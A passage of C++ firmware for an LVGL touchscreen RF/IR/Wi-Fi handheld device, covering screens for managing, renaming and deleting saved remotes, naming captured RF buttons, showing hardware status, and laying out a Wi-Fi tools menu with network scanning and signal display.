    remote_name = saved_ir_remotes[ir_index].name;
  }

  if (saved_delete_confirm_screen == NULL) create_saved_delete_confirm_screen();
  saved_hub_ignore_release_click = true;
  lv_label_set_text_fmt(saved_delete_confirm_label,
                        "%s REMOTE\n\n%s\n\nRename it or delete it?",
                        saved_delete_pending_is_ir ? "IR" : "RF", remote_name);
  lv_scr_load(saved_delete_confirm_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void confirm_saved_hub_delete(lv_event_t *e) {
  saved_hub_ignore_release_click = false;
  if (saved_delete_pending_is_ir) {
    if (saved_delete_pending_index >= saved_ir_remote_count) {
      open_saved(e);
      return;
    }
    for (uint8_t i = saved_delete_pending_index; i + 1 < saved_ir_remote_count; i++) {
      saved_ir_remotes[i] = saved_ir_remotes[i + 1];
      saved_ir_layouts[i] = saved_ir_layouts[i + 1];
    }
    saved_ir_remote_count--;
    memset(&saved_ir_layouts[saved_ir_remote_count], 0, sizeof(SavedRemoteLayout));
    if (saved_ir_remote_count == 0) {
      selected_ir_saved_index = -1;
    } else if (selected_ir_saved_index < 0 || selected_ir_saved_index >= saved_ir_remote_count) {
      selected_ir_saved_index = 0;
    }
    persist_saved_ir_remotes();
    persist_saved_remote_layouts();
    refresh_ir_saved_summary();
    Serial.println("Saved IR remote deleted");
  } else {
    if (saved_delete_pending_index >= saved_remote_count) {
      open_saved(e);
      return;
    }
    for (uint8_t i = saved_delete_pending_index; i + 1 < saved_remote_count; i++) {
      saved_remotes[i] = saved_remotes[i + 1];
      saved_rf_layouts[i] = saved_rf_layouts[i + 1];
      memcpy(saved_rf_raw_commands[i], saved_rf_raw_commands[i + 1],
             sizeof(saved_rf_raw_commands[i]));
      persist_saved_rf_raw_command_bank(i);
    }
    saved_remote_count--;
    memset(&saved_rf_layouts[saved_remote_count], 0, sizeof(SavedRemoteLayout));
    clear_saved_rf_raw_commands(saved_remote_count);
    if (saved_remote_count == 0) {
      selected_saved_index = -1;
    } else if (selected_saved_index < 0 || selected_saved_index >= saved_remote_count) {
      selected_saved_index = 0;
    }
    discovery_anchor_index = -1;
    persist_saved_remotes();
    persist_saved_remote_layouts();
    refresh_saved_summary();
    Serial.println("Saved RF remote deleted");
  }

  refresh_saved_hub();
  lv_scr_load(saved_hub_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void cancel_saved_hub_delete(lv_event_t *e) {
  saved_hub_ignore_release_click = false;
  open_saved(e);
}

void begin_saved_remote_rename(lv_event_t *e) {
  if (saved_rename_screen == NULL) create_saved_rename_screen();
  if ((saved_delete_pending_is_ir &&
       saved_delete_pending_index >= saved_ir_remote_count) ||
      (!saved_delete_pending_is_ir &&
       saved_delete_pending_index >= saved_remote_count)) {
    saved_hub_ignore_release_click = false;
    open_saved(e);
    set_status("REMOTE NO LONGER AVAILABLE", COLOR_MUTED);
    return;
  }
  const char *name = saved_delete_pending_is_ir ?
    saved_ir_remotes[saved_delete_pending_index].name :
    saved_remotes[saved_delete_pending_index].name;
  lv_textarea_set_text(saved_rename_textarea, name);
  lv_scr_load(saved_rename_screen);
}

void commit_saved_remote_rename(lv_event_t *e) {
  const char *name = lv_textarea_get_text(saved_rename_textarea);
  if (name == NULL || name[0] == '\0') {
    set_status("ENTER A REMOTE NAME", COLOR_RED);
    return;
  }
  if (saved_delete_pending_is_ir) {
    if (saved_delete_pending_index >= saved_ir_remote_count) return;
    strlcpy(saved_ir_remotes[saved_delete_pending_index].name, name,
            sizeof(saved_ir_remotes[saved_delete_pending_index].name));
    persist_saved_ir_remotes();
    refresh_ir_saved_summary();
  } else {
    if (saved_delete_pending_index >= saved_remote_count) return;
    strlcpy(saved_remotes[saved_delete_pending_index].name, name,
            sizeof(saved_remotes[saved_delete_pending_index].name));
    persist_saved_remotes();
    refresh_saved_summary();
  }
  saved_hub_ignore_release_click = false;
  refresh_saved_hub();
  lv_scr_load(saved_hub_screen);
  set_status("REMOTE RENAMED", COLOR_GREEN);
}


void refresh_saved_hub() {
  if (saved_hub_screen == NULL) return;

  uint8_t total = 0;
  for (uint8_t i = 0; i < saved_remote_count && total < MAX_SAVED_HUB_TILES; i++, total++) {
    lv_label_set_text(saved_hub_tile_name_labels[total], saved_remotes[i].name);
    lv_label_set_text(saved_hub_tile_type_labels[total], "RF REMOTE");
    lv_obj_set_style_border_color(saved_hub_tiles[total], lv_color_hex(COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_shadow_color(saved_hub_tiles[total], lv_color_hex(COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_text_color(saved_hub_tile_type_labels[total], lv_color_hex(COLOR_RF), LV_PART_MAIN);
    lv_obj_clear_flag(saved_hub_rf_icons[total], LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(saved_hub_ir_icons[total], LV_OBJ_FLAG_HIDDEN);
    lv_obj_clear_flag(saved_hub_tiles[total], LV_OBJ_FLAG_HIDDEN);
  }
  for (uint8_t i = 0; i < saved_ir_remote_count && total < MAX_SAVED_HUB_TILES; i++, total++) {
    lv_label_set_text(saved_hub_tile_name_labels[total], saved_ir_remotes[i].name);
    lv_label_set_text(saved_hub_tile_type_labels[total], "IR REMOTE");
    lv_obj_set_style_border_color(saved_hub_tiles[total], lv_color_hex(COLOR_IR), LV_PART_MAIN);
    lv_obj_set_style_shadow_color(saved_hub_tiles[total], lv_color_hex(COLOR_IR), LV_PART_MAIN);
    lv_obj_set_style_text_color(saved_hub_tile_type_labels[total], lv_color_hex(COLOR_IR), LV_PART_MAIN);
    lv_obj_add_flag(saved_hub_rf_icons[total], LV_OBJ_FLAG_HIDDEN);
    lv_obj_clear_flag(saved_hub_ir_icons[total], LV_OBJ_FLAG_HIDDEN);
    lv_obj_clear_flag(saved_hub_tiles[total], LV_OBJ_FLAG_HIDDEN);
  }
  for (uint8_t i = total; i < MAX_SAVED_HUB_TILES; i++) {
    lv_obj_add_flag(saved_hub_tiles[i], LV_OBJ_FLAG_HIDDEN);
  }

  if (total == 0) {
    lv_label_set_text(saved_hub_empty_label, "No saved remotes yet.");
    lv_obj_clear_flag(saved_hub_empty_label, LV_OBJ_FLAG_HIDDEN);
  } else {
    lv_obj_add_flag(saved_hub_empty_label, LV_OBJ_FLAG_HIDDEN);
  }
}


void create_saved_hub_screen() {
  saved_hub_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(saved_hub_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(saved_hub_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_header(saved_hub_screen, "SAVED REMOTES");

  saved_hub_label = lv_label_create(saved_hub_screen);
  lv_label_set_text(saved_hub_label, "TAP TO OPEN - HOLD TO MANAGE");
  lv_obj_set_style_text_color(saved_hub_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(saved_hub_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(saved_hub_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(saved_hub_label, LV_ALIGN_TOP_MID, 0, 105);

  lv_obj_t *tile_list = lv_obj_create(saved_hub_screen);
  lv_obj_set_size(tile_list, 290, 230);
  lv_obj_set_pos(tile_list, 15, 130);
  lv_obj_set_style_pad_all(tile_list, 5, LV_PART_MAIN);
  lv_obj_set_style_bg_color(tile_list, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_border_color(tile_list, lv_color_hex(COLOR_SAVED), LV_PART_MAIN);
  lv_obj_set_style_border_width(tile_list, 1, LV_PART_MAIN);
  lv_obj_set_style_radius(tile_list, 10, LV_PART_MAIN);
  lv_obj_set_scroll_dir(tile_list, LV_DIR_VER);

  saved_hub_empty_label = lv_label_create(tile_list);
  lv_obj_set_style_text_color(saved_hub_empty_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_center(saved_hub_empty_label);

  for (uint8_t i = 0; i < MAX_SAVED_HUB_TILES; i++) {
    int tile_x = 7 + (i % 2) * 138;
    int tile_y = 5 + (i / 2) * 108;
    saved_hub_tiles[i] = create_button(tile_list, tile_x, tile_y, 128, 100, "", COLOR_SAVED, NULL);
    saved_hub_tile_name_labels[i] = lv_obj_get_child(saved_hub_tiles[i], 0);
    lv_obj_set_width(saved_hub_tile_name_labels[i], 116);
    lv_label_set_long_mode(saved_hub_tile_name_labels[i], LV_LABEL_LONG_DOT);
    lv_obj_set_style_text_font(saved_hub_tile_name_labels[i], &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_set_style_text_align(saved_hub_tile_name_labels[i], LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
    lv_obj_align(saved_hub_tile_name_labels[i], LV_ALIGN_BOTTOM_MID, 0, -5);

    saved_hub_tile_type_labels[i] = lv_label_create(saved_hub_tiles[i]);
    lv_obj_set_width(saved_hub_tile_type_labels[i], 116);
    lv_obj_set_style_text_font(saved_hub_tile_type_labels[i], &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_set_style_text_align(saved_hub_tile_type_labels[i], LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
    lv_obj_align(saved_hub_tile_type_labels[i], LV_ALIGN_TOP_MID, 0, 59);

    // Store both visual symbols once, then show the correct one when this
    // reusable library tile is assigned to an RF or IR saved remote.
    saved_hub_rf_icons[i] = lv_obj_create(saved_hub_tiles[i]);
    lv_obj_set_size(saved_hub_rf_icons[i], 128, 58);
    lv_obj_set_pos(saved_hub_rf_icons[i], 0, 1);
    lv_obj_set_style_bg_opa(saved_hub_rf_icons[i], LV_OPA_TRANSP, LV_PART_MAIN);
    lv_obj_set_style_border_width(saved_hub_rf_icons[i], 0, LV_PART_MAIN);
    create_home_thumbnail(saved_hub_rf_icons[i], "RF", COLOR_RF);

    saved_hub_ir_icons[i] = lv_obj_create(saved_hub_tiles[i]);
    lv_obj_set_size(saved_hub_ir_icons[i], 128, 58);
    lv_obj_set_pos(saved_hub_ir_icons[i], 0, 1);
    lv_obj_set_style_bg_opa(saved_hub_ir_icons[i], LV_OPA_TRANSP, LV_PART_MAIN);
    lv_obj_set_style_border_width(saved_hub_ir_icons[i], 0, LV_PART_MAIN);
    create_home_thumbnail(saved_hub_ir_icons[i], "IR", COLOR_IR);
    lv_obj_add_flag(saved_hub_ir_icons[i], LV_OBJ_FLAG_HIDDEN);

    lv_obj_add_event_cb(saved_hub_tiles[i], open_saved_hub_tile, LV_EVENT_CLICKED, (void *)(uintptr_t)i);
    lv_obj_add_event_cb(saved_hub_tiles[i], request_saved_hub_delete, LV_EVENT_LONG_PRESSED, (void *)(uintptr_t)i);
    lv_obj_add_flag(saved_hub_tiles[i], LV_OBJ_FLAG_HIDDEN);
  }

  create_button(saved_hub_screen, 70, 382, 180, 36, "HOME", COLOR_SAVED, go_home);
  create_footer(saved_hub_screen);
  refresh_saved_hub();
}


void create_saved_delete_confirm_screen() {
  saved_delete_confirm_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(saved_delete_confirm_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(saved_delete_confirm_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_header(saved_delete_confirm_screen, "MANAGE REMOTE");

  saved_delete_confirm_label = lv_label_create(saved_delete_confirm_screen);
  lv_obj_set_style_text_color(saved_delete_confirm_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(saved_delete_confirm_label, &lv_font_montserrat_16, LV_PART_MAIN);
  lv_obj_set_style_text_align(saved_delete_confirm_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(saved_delete_confirm_label, LV_ALIGN_TOP_MID, 0, 135);

  create_button(saved_delete_confirm_screen, 14, 330, 90, 42,
                "CANCEL", COLOR_SAVED, cancel_saved_hub_delete);
  create_button(saved_delete_confirm_screen, 115, 330, 90, 42,
                "RENAME", COLOR_GREEN, begin_saved_remote_rename);
  create_button(saved_delete_confirm_screen, 216, 330, 90, 42,
                "DELETE", COLOR_RED, confirm_saved_hub_delete);
  create_footer(saved_delete_confirm_screen);
}

void create_saved_rename_screen() {
  saved_rename_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(saved_rename_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(saved_rename_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_header(saved_rename_screen, "RENAME REMOTE");

  saved_rename_textarea = lv_textarea_create(saved_rename_screen);
  lv_textarea_set_one_line(saved_rename_textarea, true);
  lv_textarea_set_max_length(saved_rename_textarea, 23);
  lv_obj_set_size(saved_rename_textarea, 270, 42);
  lv_obj_align(saved_rename_textarea, LV_ALIGN_TOP_MID, 0, 100);

  lv_obj_t *keyboard = lv_keyboard_create(saved_rename_screen);
  lv_keyboard_set_textarea(keyboard, saved_rename_textarea);
  lv_obj_set_size(keyboard, 320, 170);
  lv_obj_align(keyboard, LV_ALIGN_TOP_MID, 0, 150);

  create_button(saved_rename_screen, 28, 338, 126, 40,
                "CANCEL", COLOR_SAVED, cancel_saved_hub_delete);
  create_button(saved_rename_screen, 166, 338, 126, 40,
                "SAVE NAME", COLOR_GREEN, commit_saved_remote_rename);
  create_footer(saved_rename_screen);
}


void commit_rf_button_name(lv_event_t *e) {
  if (discovery_button_naming && dip_fan_working_count > 0) {
    const char *entered_name = lv_textarea_get_text(rf_button_name_textarea);
    if (entered_name != NULL && entered_name[0] != '\0') {
      strlcpy(dip_fan_working_names[dip_fan_working_count - 1], entered_name,
              sizeof(dip_fan_working_names[0]));
    }
    discovery_button_naming = false;
    refresh_dip_fan_discovery();
    lv_scr_load(dip_fan_discovery_screen);
    set_status("CONTROL ADDED", COLOR_GREEN);
    return;
  }
  if (universal_button_count <= 0) {
    open_universal_remote(e);
    return;
  }
  const uint8_t index = universal_button_count - 1;
  const char *entered_name = lv_textarea_get_text(rf_button_name_textarea);
  if (entered_name != NULL && entered_name[0] != '\0') {
    strlcpy(universal_button_names[index], entered_name,
            sizeof(universal_button_names[index]));
  }
  refresh_universal_remote();
  lv_scr_load(universal_remote_screen);
  set_status("BUTTON NAMED", COLOR_GREEN);
}


void create_rf_button_name_screen() {
  rf_button_name_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(rf_button_name_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(rf_button_name_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(rf_button_name_screen, false);
  create_header(rf_button_name_screen, "NAME RF BUTTON");

  lv_obj_t *info = lv_label_create(rf_button_name_screen);
  lv_label_set_text(info, "Name the control you just captured or confirmed.\nExamples: OPEN, STOP, LIGHT, SPEED+");
  lv_obj_set_style_text_color(info, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(info, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_set_style_text_align(info, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(info, LV_ALIGN_TOP_MID, 0, 78);

  rf_button_name_textarea = lv_textarea_create(rf_button_name_screen);
  lv_textarea_set_one_line(rf_button_name_textarea, true);
  lv_textarea_set_max_length(rf_button_name_textarea, 19);
  lv_textarea_set_placeholder_text(rf_button_name_textarea, "Example: FAN HIGH");
  lv_obj_set_size(rf_button_name_textarea, 270, 42);
  lv_obj_align(rf_button_name_textarea, LV_ALIGN_TOP_MID, 0, 135);

  lv_obj_t *keyboard = lv_keyboard_create(rf_button_name_screen);
  lv_keyboard_set_textarea(keyboard, rf_button_name_textarea);
  lv_obj_set_size(keyboard, 320, 155);
  lv_obj_align(keyboard, LV_ALIGN_TOP_MID, 0, 185);

  create_button(rf_button_name_screen, 45, 350, 230, 42,
                "SAVE BUTTON NAME", COLOR_GREEN, commit_rf_button_name);
  create_footer(rf_button_name_screen);
}


void create_universal_name_screen() {
  universal_name_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(universal_name_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(universal_name_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(universal_name_screen, false);
  create_header(universal_name_screen, "NAME REMOTE");

  universal_name_textarea = lv_textarea_create(universal_name_screen);
  lv_textarea_set_one_line(universal_name_textarea, true);
  lv_textarea_set_placeholder_text(universal_name_textarea, "Remote name");
  lv_obj_set_size(universal_name_textarea, 260, 42);
  lv_obj_align(universal_name_textarea, LV_ALIGN_TOP_MID, 0, 105);

  lv_obj_t *keyboard = lv_keyboard_create(universal_name_screen);
  lv_keyboard_set_textarea(keyboard, universal_name_textarea);
  lv_obj_set_size(keyboard, 320, 170);
  lv_obj_align(keyboard, LV_ALIGN_TOP_MID, 0, 155);

  create_button(universal_name_screen, 35, 345, 120, 40, "SAVE", COLOR_GREEN, commit_universal_save);
  create_button(universal_name_screen, 165, 345, 120, 40, "CANCEL", COLOR_RED, open_universal_remote);
  create_footer(universal_name_screen);
}


void refresh_hardware_status() {
  if (hardware_status_label == NULL) {
    return;
  }

  // Keep the normal display compact.  Only call out a specific IR part when
  // that part is unavailable, rather than showing separate IN/OUT rows.
  char ir_status[32];
  if (ir_transmitter_ready && ir_receiver_ready) {
    snprintf(ir_status, sizeof(ir_status), "IR OK");
  } else if (!ir_transmitter_ready && !ir_receiver_ready) {
    snprintf(ir_status, sizeof(ir_status), "NO IR");
  } else if (!ir_transmitter_ready) {
    snprintf(ir_status, sizeof(ir_status), "IR EMITTER OFFLINE");
  } else {
    snprintf(ir_status, sizeof(ir_status), "IR RECEIVER OFFLINE");
  }

  // LVGL's compact label formatter on this build does not support %f. Build
  // the two decimal digits as integers so the status can still show XX.XX GB.
  const uint64_t sd_free_bytes = sd_card_ready && sd_card_total_bytes >= sd_card_used_bytes
    ? (sd_card_total_bytes - sd_card_used_bytes)
    : 0;
  const uint32_t sd_free_gb = (uint32_t)(sd_free_bytes / 1073741824ULL);
  const uint8_t sd_free_gb_hundredths =
    (uint8_t)(((sd_free_bytes % 1073741824ULL) * 100ULL) / 1073741824ULL);

  // The status lights replace repetitive READY text.  Rows are RF, IR, SD.
  const bool hardware_rows_ready[HARDWARE_STATUS_DOT_COUNT] = {
    cc1101_ready,
    ir_transmitter_ready && ir_receiver_ready,
    sd_card_ready
  };
  for (uint8_t i = 0; i < HARDWARE_STATUS_DOT_COUNT; ++i) {
    if (hardware_status_dots[i] != NULL) {
      lv_obj_set_style_bg_color(
        hardware_status_dots[i],
        lv_color_hex(hardware_rows_ready[i] ? COLOR_GREEN : COLOR_RED),
        LV_PART_MAIN
      );
    }
  }

  if (sd_card_ready) {
    lv_label_set_text_fmt(
      hardware_status_label,
      "RF RADIO\n%s\nSD STORAGE  %lu.%02u GB FREE",
      ir_status,
      (unsigned long)sd_free_gb,
      sd_free_gb_hundredths
    );
  } else {
    lv_label_set_text_fmt(
      hardware_status_label,
      "RF RADIO\n%s\nSD STORAGE  MISSING",
      ir_status
    );
  }
}


void retry_cc1101_probe(lv_event_t *e) {
  cc1101_ready = initialize_cc1101();
  refresh_hardware_status();
  set_status(
    cc1101_ready ? "CC1101 READY" : "CC1101 NOT DETECTED",
    cc1101_ready ? COLOR_GREEN : COLOR_RED
  );
}


void create_wifi_screen() {
  wifi_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(wifi_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(wifi_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(wifi_screen, false);
  create_header(wifi_screen, "WI-FI TOOLS");

  wifi_info_label = lv_label_create(wifi_screen);
  lv_label_set_text(wifi_info_label, "Choose a Wi-Fi feature.");
  lv_obj_set_width(wifi_info_label, 292);
  lv_obj_set_style_text_align(wifi_info_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_set_style_text_color(wifi_info_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(wifi_info_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_align(wifi_info_label, LV_ALIGN_TOP_MID, 0, 88);

  lv_obj_t *feature_list = lv_obj_create(wifi_screen);
  lv_obj_set_size(feature_list, 304, 282);
  lv_obj_set_pos(feature_list, 8, 112);
  lv_obj_set_style_pad_all(feature_list, 5, LV_PART_MAIN);
  lv_obj_set_style_bg_opa(feature_list, LV_OPA_TRANSP, LV_PART_MAIN);
  lv_obj_set_style_border_width(feature_list, 0, LV_PART_MAIN);
  lv_obj_set_scroll_dir(feature_list, LV_DIR_VER);
  lv_obj_set_scrollbar_mode(feature_list, LV_SCROLLBAR_MODE_AUTO);

  for (uint8_t i = 0; i < WIFI_COMPARISON_MENU_COUNT; i++) {
    lv_event_cb_t callback = NULL;
    if (i == 0) callback = open_wifi_networks;
    else if (i == 1) callback = open_wifi_live_signal;
    else if (i == 2) callback = open_wifi_channels;
    else if (i == 7) callback = open_wifi_defensive_monitor;
    else if (i == 18) callback = open_wifi_custom_ssids;
    uint32_t color = i <= 2 ? COLOR_GREEN : (i <= 6 ? COLOR_RF : (i <= 9 ? COLOR_RED : COLOR_SETTINGS));
    lv_obj_t *button = create_button(feature_list, 2, 2 + i * 50, 282, 44,
                                     WIFI_COMPARISON_MENU_NAMES[i], color, callback);
    lv_obj_t *button_label = lv_obj_get_child(button, 0);
    lv_obj_set_width(button_label, 266);
    lv_label_set_long_mode(button_label, LV_LABEL_LONG_WRAP);
    lv_obj_set_style_text_font(button_label, &lv_font_montserrat_12, LV_PART_MAIN);
    if (callback == NULL)
      lv_obj_add_event_cb(button, open_wifi_tool, LV_EVENT_CLICKED, (void *)(uintptr_t)i);
  }
  create_button(wifi_screen, 70, 402, 180, 30, "HOME", COLOR_SETTINGS, go_home);
  create_footer(wifi_screen);

  wifi_networks_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(wifi_networks_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(wifi_networks_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(wifi_networks_screen, false);
  create_header(wifi_networks_screen, "NEARBY NETWORKS");
  wifi_results_heading = lv_label_create(wifi_networks_screen);
  lv_label_set_text(wifi_results_heading, "READY TO SCAN");
  lv_obj_set_style_text_color(wifi_results_heading, lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
  lv_obj_set_style_text_font(wifi_results_heading, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_align(wifi_results_heading, LV_ALIGN_TOP_MID, 0, 92);
  wifi_network_list = lv_obj_create(wifi_networks_screen);
  lv_obj_set_size(wifi_network_list, 296, 238);
  lv_obj_set_pos(wifi_network_list, 12, 120);
  lv_obj_set_style_pad_all(wifi_network_list, 8, LV_PART_MAIN);
  lv_obj_set_style_bg_color(wifi_network_list, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(wifi_network_list, LV_OPA_50, LV_PART_MAIN);
  lv_obj_set_style_border_width(wifi_network_list, 0, LV_PART_MAIN);
  lv_obj_set_scroll_dir(wifi_network_list, LV_DIR_VER);
  lv_obj_set_scrollbar_mode(wifi_network_list, LV_SCROLLBAR_MODE_AUTO);
  create_button(wifi_networks_screen, 8, 366, 96, 34,
                "SCAN", COLOR_GREEN, scan_nearby_wifi);
  create_button(wifi_networks_screen, 112, 366, 96, 34,
                "SAVE", COLOR_SAVED, save_wifi_scan_history);
  create_button(wifi_networks_screen, 216, 366, 96, 34,
                "CHANNELS", COLOR_RF, open_wifi_channels);
  create_button(wifi_networks_screen, 70, 406, 180, 28, "<  WI-FI TOOLS", COLOR_SETTINGS, back_to_wifi_home);
  create_footer(wifi_networks_screen);
  refresh_wifi_network_list();

  wifi_detail_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(wifi_detail_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(wifi_detail_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(wifi_detail_screen, false);
  create_header(wifi_detail_screen, "NETWORK DETAILS");
  wifi_detail_name_label = lv_label_create(wifi_detail_screen);
  lv_label_set_text(wifi_detail_name_label, "NETWORK");
  lv_obj_set_width(wifi_detail_name_label, 286);
  lv_label_set_long_mode(wifi_detail_name_label, LV_LABEL_LONG_DOT);
  lv_obj_set_style_text_align(wifi_detail_name_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_set_style_text_color(wifi_detail_name_label, lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
  lv_obj_set_style_text_font(wifi_detail_name_label, &lv_font_montserrat_16, LV_PART_MAIN);
  lv_obj_align(wifi_detail_name_label, LV_ALIGN_TOP_MID, 0, 100);
  lv_obj_t *meter = lv_obj_create(wifi_detail_screen);
  lv_obj_set_size(meter, 272, 30);
  lv_obj_set_pos(meter, 24, 154);
  lv_obj_set_style_pad_all(meter, 4, LV_PART_MAIN);
  lv_obj_set_style_bg_color(meter, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_border_color(meter, lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
  lv_obj_set_style_border_width(meter, 1, LV_PART_MAIN);
  lv_obj_set_style_radius(meter, 8, LV_PART_MAIN);
  lv_obj_clear_flag(meter, LV_OBJ_FLAG_SCROLLABLE);
  wifi_detail_meter_fill = lv_obj_create(meter);
  lv_obj_set_size(wifi_detail_meter_fill, 8, 20);
  lv_obj_align(wifi_detail_meter_fill, LV_ALIGN_LEFT_MID, 0, 0);
  lv_obj_set_style_bg_color(wifi_detail_meter_fill, lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
  lv_obj_set_style_border_width(wifi_detail_meter_fill, 0, LV_PART_MAIN);
  lv_obj_set_style_radius(wifi_detail_meter_fill, 5, LV_PART_MAIN);
  lv_obj_clear_flag(wifi_detail_meter_fill, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_t *rssi_graph = lv_obj_create(wifi_detail_screen);
  lv_obj_set_size(rssi_graph, 286, 76);
  lv_obj_set_pos(rssi_graph, 17, 194);
  lv_obj_set_style_pad_all(rssi_graph, 4, LV_PART_MAIN);
  lv_obj_set_style_bg_color(rssi_graph, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_border_color(rssi_graph, lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
  lv_obj_set_style_border_width(rssi_graph, 1, LV_PART_MAIN);
  lv_obj_set_style_radius(rssi_graph, 8, LV_PART_MAIN);
  lv_obj_clear_flag(rssi_graph, LV_OBJ_FLAG_SCROLLABLE);
  for (uint8_t i = 0; i < WIFI_RSSI_HISTORY_POINTS; i++) {
    lv_obj_t *column = lv_obj_create(rssi_graph);
    lv_obj_set_size(column, 8, 62);
    lv_obj_set_pos(column, i * 9, 2);
    lv_obj_set_style_bg_opa(column, LV_OPA_TRANSP, LV_PART_MAIN);
    lv_obj_set_style_border_width(column, 0, LV_PART_MAIN);
    lv_obj_set_style_pad_all(column, 0, LV_PART_MAIN);
    lv_obj_clear_flag(column, LV_OBJ_FLAG_SCROLLABLE);
    wifi_rssi_history_bars[i] = lv_obj_create(column);
    lv_obj_set_size(wifi_rssi_history_bars[i], 6, 2);
    lv_obj_align(wifi_rssi_history_bars[i], LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(wifi_rssi_history_bars[i], lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
    lv_obj_set_style_border_width(wifi_rssi_history_bars[i], 0, LV_PART_MAIN);
    lv_obj_clear_flag(wifi_rssi_history_bars[i], LV_OBJ_FLAG_SCROLLABLE);
  }
  wifi_detail_info_label = lv_label_create(wifi_detail_screen);
  lv_label_set_text(wifi_detail_info_label, "Signal details");
  lv_obj_set_width(wifi_detail_info_label, 286);
  lv_obj_set_style_text_align(wifi_detail_info_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_set_style_text_color(wifi_detail_info_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(wifi_detail_info_label, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_align(wifi_detail_info_label, LV_ALIGN_TOP_MID, 0, 282);
  lv_obj_t *live_note = lv_label_create(wifi_detail_screen);
  lv_label_set_text(live_note, "LIVE SIGNAL\nMove around to see the strength change.");
  lv_obj_set_width(live_note, 280);
  lv_obj_set_style_text_align(live_note, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_set_style_text_color(live_note, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(live_note, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_align(live_note, LV_ALIGN_TOP_MID, 0, 350);
  create_button(wifi_detail_screen, 18, 398, 136, 30,
                "CONNECT", COLOR_GREEN, open_selected_wifi_connection);
  create_button(wifi_detail_screen, 166, 398, 136, 30,
                "<  NETWORKS", COLOR_SETTINGS, back_to_wifi_networks);
  create_footer(wifi_detail_screen);

  wifi_connect_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(wifi_connect_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(wifi_connect_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(wifi_connect_screen, false);
  create_header(wifi_connect_screen, "CONNECT TO WI-FI");

  wifi_connect_network_label = lv_label_create(wifi_connect_screen);
  lv_obj_set_width(wifi_connect_network_label, 294);
